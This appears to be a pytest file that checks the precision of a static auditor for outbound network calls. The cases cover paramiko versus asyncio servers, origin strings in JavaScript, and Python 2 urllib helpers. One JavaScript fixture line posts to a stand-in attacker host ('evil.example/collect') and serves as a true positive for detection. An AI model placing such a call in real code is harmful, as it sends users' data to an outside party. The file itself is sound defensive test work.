"""Precision: `start_server` without asyncio, origin strings that make no request, and Python 2 urllib
string helpers.

These cases are in-sample: the tool is fitted to them, so a precision figure for it needs repositories it has
never been tuned on. Each test pins the false claim AND the true positive beside it.
"""
from entrovouch.no_egress_auditor import audit


def _findings(tmp_path, files):
    for name, text in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    rep = audit(tmp_path)
    get = lambda f, k: f[k] if isinstance(f, dict) else getattr(f, k)   # noqa: E731
    return [(get(f, "file").replace("\\", "/"), get(f, "line"), get(f, "kind"), get(f, "detail")) for f in rep.findings]


def test_start_server_without_asyncio_is_not_called_an_asyncio_connection(tmp_path):
    out = _findings(tmp_path, {
        "ssh.py": "import paramiko\nt = paramiko.Transport(sock)\nt.start_server(server=srv)\n",
        "aio.py": "import asyncio\nasync def m():\n    await asyncio.start_server(h, '0.0.0.0', 80)\n"
                  "    await asyncio.open_connection('example.com', 80)\n",
        "loop.py": "from asyncio import get_event_loop\nloop = get_event_loop()\nloop.create_connection(P, 'h', 1)\n",
    })
    ssh = [f for f in out if f[0] == "ssh.py" and f[1] == 3]
    assert ssh and "asyncio network connection" not in ssh[0][3] and "NOT resolved" in ssh[0][3]  # still reported
    assert ("aio.py", 3, "inbound-listener") in [f[:3] for f in out]                            # a server is inbound
    assert any(f[:3] == ("aio.py", 4, "network-call") and "asyncio network connection" in f[3] for f in out)
    assert any(f[:3] == ("loop.py", 3, "network-call") and "asyncio network connection" in f[3] for f in out)


def test_origin_strings_are_not_external_urls_but_requests_still_are(tmp_path):
    js = ('frame.contentWindow.postMessage(token, "http://localhost:8003");\n'
          'if (origin !== "http://localhost:8003") { return; }\n'
          'fetch("https://evil.example/collect");\n'
          'postMessage(fetch("https://e.example"), "https://o.example");\n'
          'if (origin !== "https://a.example") { load("https://cdn.example/x.js"); }\n')
    out = [f for f in _findings(tmp_path, {"app.js": js}) if f[0] == "app.js"]
    by_line = {f[1]: f[3] for f in out}
    assert "no request from this line" in by_line[1] and "no request from this line" in by_line[2]
    for line in (3, 4, 5):
        assert "no request" not in by_line[line], (line, by_line[line])


def test_python2_urllib_string_helpers_are_pure_but_urlopen_is_not(tmp_path):
    out = _findings(tmp_path, {"a.py": "from urllib import quote, unquote_plus\n",
                               "b.py": "from urllib import urlopen\n",
                               "c.py": "from urllib import quote, urlopen\n"})
    files = {f[0] for f in out}
    assert "a.py" not in files
    assert "b.py" in files and "c.py" in files       # one network name keeps the whole import reported
